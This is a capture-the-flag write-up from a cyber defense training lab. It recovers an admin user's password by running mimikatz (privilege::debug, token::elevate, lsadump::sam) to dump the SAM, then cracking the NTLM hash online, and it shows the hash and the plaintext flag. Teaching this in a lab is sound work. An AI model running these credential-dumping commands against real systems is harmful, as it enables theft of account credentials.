# Crimson initiate

## Description

*NOTE* - The resources needed for this challenge are on the `Cyber Defense CTF Triage Workstation` VM on our [hosted platform](https://training.leveleffect.com/courses/f4a9466f-edb0-42ff-bb0e-a95af2b05de5).

Let's dabble a bit on the offensive side. There is a user named `crimson` with admin privileges on the Triage Workstation. Use any method you prefer to get the user's password. The password is the flag.

You are able to download tools to the workstation if need be.



## Solution

Install mimikatz on the virtual machine

```powershell
cd .\mimikatz_trunk\
cd x64
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

Output includes:

```
RID  : 000003e8 (1000)
User : crimson
  Hash NTLM: 437dbf185f1e3718a00baf073959b3f4
```

Take the NTLM hash and put it into [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/) 



| Hash                             | Type | Result         |
| -------------------------------- | ---- | -------------- |
| 437dbf185f1e3718a00baf073959b3f4 | NTLM | vermillion0727 |

**Flag: vermillion0727**


